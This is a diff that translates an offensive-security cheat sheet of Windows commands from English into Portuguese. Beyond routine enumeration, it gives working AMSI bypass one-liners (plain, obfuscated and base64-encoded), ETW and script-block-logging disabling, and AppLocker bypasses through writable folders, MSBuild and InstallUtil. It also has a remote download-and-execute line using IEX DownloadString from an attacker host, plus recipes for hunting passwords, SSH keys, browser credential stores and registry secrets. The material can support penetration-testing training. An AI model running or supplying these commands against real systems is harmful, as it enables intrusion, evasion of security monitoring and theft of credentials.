@@ -1,52 +1,52 @@
-# Windows Command
+# Comandos Windows
 
-## Table of Contents
+## Índice
 
-- [User Enumeration](#user-enumeration)
-- [System Information](#system-information)
-- [Network Enumeration](#network-enumeration)
-- [Process and Service Enumeration](#process-and-service-enumeration)
-- [Share Enumeration](#share-enumeration)
-- [Remote Command Execution](#remote-command-execution)
-- [PowerShell Remoting Cmdlets](#powershell-remoting-cmdlets)
-- [Defense Evasion](#defense-evasion)
-  - [AMSI Bypass](#amsi-bypass)
-  - [ETW Bypass](#etw-bypass)
-  - [Script Block Logging Bypass](#script-block-logging-bypass)
-  - [AppLocker Bypass](#applocker-bypass)
-- [File Hunting](#file-hunting)
+- [Enumeração de Usuários](#enumeração-de-usuários)
+- [Informações do Sistema](#informações-do-sistema)
+- [Enumeração de Rede](#enumeração-de-rede)
+- [Enumeração de Processos e Serviços](#enumeração-de-processos-e-serviços)
+- [Enumeração de Compartilhamentos](#enumeração-de-compartilhamentos)
+- [Execução Remota de Comandos](#execução-remota-de-comandos)
+- [Cmdlets de Remoting PowerShell](#cmdlets-de-remoting-powershell)
+- [Evasão de Defesas](#evasão-de-defesas)
+  - [Bypass AMSI](#bypass-amsi)
+  - [Bypass ETW](#bypass-etw)
+  - [Bypass de Logging de Script Block](#bypass-de-logging-de-script-block)
+  - [Bypass AppLocker](#bypass-applocker)
+- [Caça a Arquivos](#caça-a-arquivos)
 
 ---
 
-## User Enumeration
+## Enumeração de Usuários
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```powershell
-# Quick Windows enumeration
+# Enumeração rápida do Windows
 whoami /all && net user && net localgroup administrators && systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 ```
 
-- List local users
+- Listar usuários locais
 
     ```shell
     Get-LocalUser
     ```
 
-- List domain users
+- Listar usuários do domínio
 
     ```powershell
     Get-ADUser -Filter *
     ```
 
-- Get current user
+- Obter usuário atual
 
     ```shell
     whoami
     $env:USERNAME
     ```
 
-- Get user groups
+- Obter grupos do usuário
 
     ```shell
     whoami /groups
@@ -56,21 +56,21 @@ whoami /all && net user && net localgroup administrators && systeminfo | findstr
 
 ---
 
-## System Information
+## Informações do Sistema
 
 ```shell
 systeminfo
 Get-ComputerInfo
 ```
 
-- OS version
+- Versão do SO
 
     ```shell
     [System.Environment]::OSVersion
     Get-WmiObject Win32_OperatingSystem
     ```
 
-- Architecture
+- Arquitetura
 
     ```shell
     [System.Environment]::Is64BitOperatingSystem
@@ -84,7 +84,7 @@ Get-ComputerInfo
     $env:COMPUTERNAME
     ```
 
-- Domain information
+- Informações do domínio
 
     ```shell
     Get-WmiObject Win32_ComputerSystem | Select Domain
@@ -92,9 +92,9 @@ Get-ComputerInfo
 
 ---
 
-## Network Enumeration
+## Enumeração de Rede
 
-- Network interfaces
+- Interfaces de rede
 
     ```shell
     ipconfig /all
@@ -102,28 +102,28 @@ Get-ComputerInfo
     Get-NetIPConfiguration
     ```
 
-- Routing table
+- Tabela de roteamento
 
     ```shell
     route print
     Get-NetRoute
     ```
 
-- ARP table
+- Tabela ARP
 
     ```shell
     arp -a
     Get-NetNeighbor
     ```
 
-- Active connections
+- Conexões ativas
 
     ```shell
     netstat -ano
     Get-NetTCPConnection
     ```
 
-- DNS cache
+- Cache DNS
 
     ```shell
     ipconfig /displaydns
@@ -132,30 +132,30 @@ Get-ComputerInfo
 
 ---
 
-## Process and Service Enumeration
+## Enumeração de Processos e Serviços
 
-- List running processes
+- Listar processos em execução
 
     ```shell
     Get-Process
     tasklist /v
     ```
 
-- Enumerate Windows services
+- Enumerar serviços do Windows
 
     ```shell
     Get-Service
     sc query
     ```
 
-- List scheduled tasks
+- Listar tarefas agendadas
 
     ```shell
     Get-ScheduledTask
     schtasks /query /fo LIST /v
     ```
 
-- List startup programs
+- Listar programas na inicialização
 
     ```shell
     Get-CimInstance Win32_StartupCommand
@@ -164,9 +164,9 @@ Get-ComputerInfo
 
 ---
 
-## Share Enumeration
+## Enumeração de Compartilhamentos
 
-- List shares
+- Listar compartilhamentos
 
     ```shell
     net share
@@ -174,14 +174,14 @@ Get-ComputerInfo
     Get-WmiObject Win32_Share
     ```
 
-- Access shares
+- Acessar compartilhamentos
 
     ```shell
     net use \\target\share
     Get-SmbMapping
     ```
 
-- Find accessible shares on network
+- Encontrar compartilhamentos acessíveis na rede
 
     ```shell
     Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
@@ -189,27 +189,27 @@ Get-ComputerInfo
 
 ---
 
-## Remote Command Execution
+## Execução Remota de Comandos
 
-- Basic command execution
+- Execução básica de comandos
 
     ```shell
     Invoke-Command -ComputerName $rhost -ScriptBlock { whoami }
     ```
 
-- Multiple commands
+- Múltiplos comandos
 
     ```shell
     Invoke-Command -ComputerName $rhost -ScriptBlock { whoami hostname ipconfig }
     ```
 
-- Execute local script on remote
+- Executar script local em máquina remota
 
     ```shell
     Invoke-Command -ComputerName $rhost -FilePath .\script.ps1
     ```
 
-- Download and execute
+- Download e execução
 
     ```shell
     Invoke-Command -ComputerName $rhost -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("http://$lhost/script.ps1")}
@@ -217,39 +217,39 @@ Get-ComputerInfo
 
 ---
 
-## PowerShell Remoting Cmdlets
+## Cmdlets de Remoting PowerShell
 
-- Interactive Remote Session
+- Sessão Remota Interativa
 
     ```shell
     Enter-PSSession -ComputerName $rhost
     ```
 
-- Exit Remote Session
+- Encerrar Sessão Remota
 
     ```shell
     Exit-PSSession
     ```
 
-- Run Command Remotely
+- Executar Comando Remotamente
 
     ```shell
     Invoke-Command -ComputerName $rhost -ScriptBlock {cmd}
     ```
 
-- Create persistent session
+- Criar sessão persistente
 
     ```shell
     $s = New-PSSession -ComputerName $rhost
     ```
 
-- Close session
+- Fechar sessão
 
     ```shell
     Remove-PSSession -Session $s
     ```
 
-- List active sessions
+- Listar sessões ativas
 
     ```shell
     Get-PSSession
@@ -257,50 +257,50 @@ Get-ComputerInfo
 
 ---
 
-## Defense Evasion
+## Evasão de Defesas
 
-### AMSI Bypass
+### Bypass AMSI
 
-> Bypass Antimalware Scan Interface to run malicious PowerShell
+> Contornar a Interface de Verificação Antimalware para executar PowerShell malicioso
 
-#### Memory Patching (One-liner)
+#### Patch de Memória (One-liner)
 
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-#### Obfuscated Version
+#### Versão Ofuscada
 
 ```powershell
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
 ```
 
-#### Matt Graeber's Method
+#### Método de Matt Graeber
 
 ```powershell
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
 ```
 
-#### Base64 Encoded One-liner
+#### One-liner em Base64
 
 ```powershell
 powershell -ep bypass -e WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbGBsACwAJAB0AHIAdQBlACkA
 ```
 
-#### Using Invisi-Shell
+#### Usando Invisi-Shell
 
 ```powershell
-# Run PowerShell without logging or AMSI
+# Executar PowerShell sem logging ou AMSI
 .\RunWithPathAsAdmin.bat
 .\RunWithRegistryNonAdmin.bat
 ```
 
 ---
 
-### ETW Bypass
+### Bypass ETW
 
-> Disable Event Tracing for Windows
+> Desabilitar Event Tracing for Windows
 
 ```powershell
 [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
@@ -308,7 +308,7 @@ powershell -ep bypass -e WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHA
 
 ---
 
-### Script Block Logging Bypass
+### Bypass de Logging de Script Block
 
 ```powershell
 $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
@@ -318,12 +318,12 @@ $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr
 
 ---
 
-### AppLocker Bypass
+### Bypass AppLocker
 
-#### Common Bypass Directories
+#### Diretórios Comuns para Bypass
 
 ```powershell
-# Default writable locations
+# Locais graváveis por padrão
 C:\Windows\Tasks
 C:\Windows\Temp
 C:\Windows\tracing
@@ -339,21 +339,21 @@ C:\Windows\SysWOW64\Tasks
 C:\Windows\SysWOW64\com\dmp
 ```
 
-#### Execute from Bypass Locations
+#### Executar a Partir dos Locais de Bypass
 
 ```cmd
 copy payload.exe C:\Windows\Tasks\
 C:\Windows\Tasks\payload.exe
 ```
 
-#### MSBuild Bypass
+#### Bypass com MSBuild
 
 ```cmd
-# Create .csproj file with embedded payload
+# Criar arquivo .csproj com payload embutido
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
 ```
 
-#### InstallUtil Bypass
+#### Bypass com InstallUtil
 
 ```cmd
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
@@ -361,64 +361,64 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToCo
 
 ---
 
-## File Hunting
+## Caça a Arquivos
 
-> Search for sensitive files on Windows systems
+> Buscar arquivos sensíveis em sistemas Windows
 
-### Search for Passwords
+### Buscar Senhas
 
 ```cmd
-:: Search in current directory recursively
+:: Busca recursiva no diretório atual
 findstr /si password *.txt *.xml *.ini *.config *.cfg
 
-:: Search in specific paths
+:: Busca em caminhos específicos
 findstr /spin "password" C:\Users\*.* 2>nul
 findstr /spin "password" C:\inetpub\*.* 2>nul
 
-:: Case-insensitive search for multiple terms
+:: Busca sem distinção de maiúsculas para múltiplos termos
 findstr /si /c:"password" /c:"passwd" /c:"pwd" /c:"secret" *.* 2>nul
 ```
 
-### PowerShell File Search
+### Busca de Arquivos com PowerShell
 
 ```powershell
-# Search for files containing passwords
+# Buscar arquivos contendo senhas
 Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | 
   Select-String -Pattern "password|passwd|pwd|secret" | Select-Object Path,LineNumber,Line
 
-# Find specific file types
+# Encontrar tipos específicos de arquivo
 Get-ChildItem -Path C:\ -Include *.kdbx,*.pfx,*.p12,*.ppk,*.pem -Recurse -ErrorAction SilentlyContinue
 
-# Find files modified recently
+# Encontrar arquivos modificados recentemente
 Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | 
   Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)}
 ```
 
-### Common Sensitive Files
+### Arquivos Sensíveis Comuns
 
 ```cmd
-:: Find config files
+:: Encontrar arquivos de configuração
 dir /s /b *.config *.ini *.xml *.txt 2>nul | findstr /i "password web.config app.config"
 
-:: Find credential files
+:: Encontrar arquivos de credenciais
 dir /s /b C:\Users\*password* C:\Users\*cred* C:\Users\*secret* 2>nul
 
-:: Find SSH keys
+:: Encontrar chaves SSH
 dir /s /b C:\Users\*.ppk C:\Users\id_rsa C:\Users\.ssh 2>nul
 
-:: Find browser credentials
+:: Encontrar credenciais do navegador
 dir /s /b "%APPDATA%\Microsoft\Credentials\*" 2>nul
 dir /s /b "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul
 ```
 
-### Registry Credential Search
+### Busca de Credenciais no Registro
 
 ```cmd
-:: Search registry for passwords
+:: Buscar senhas no registro
 reg query HKLM /f password /t REG_SZ /s 2>nul
 reg query HKCU /f password /t REG_SZ /s 2>nul
 
-:: Common credential locations
+:: Locais comuns de credenciais
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 2>nul
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul
@@ -426,9 +426,9 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul
 
 ---
 
-## See Also
+## Veja Também
 
-- **[Linux Command](6.2.Linux-command.md)** - Linux system commands
-- **[Reverse Shell](6.3.Reverse-Shell.md)** - Shell payloads for Windows and Linux
-- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Windows privesc techniques
-- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Active Directory attacks
+- **[Comandos Linux](Linux-command.md)** - Comandos de sistema Linux
+- **[Reverse Shell](Reverse-Shell.md)** - Payloads de shell para Windows e Linux
+- **[Escalação de Privilégios Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Técnicas de privesc no Windows
+- **[Exploração AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Ataques ao Active Directory
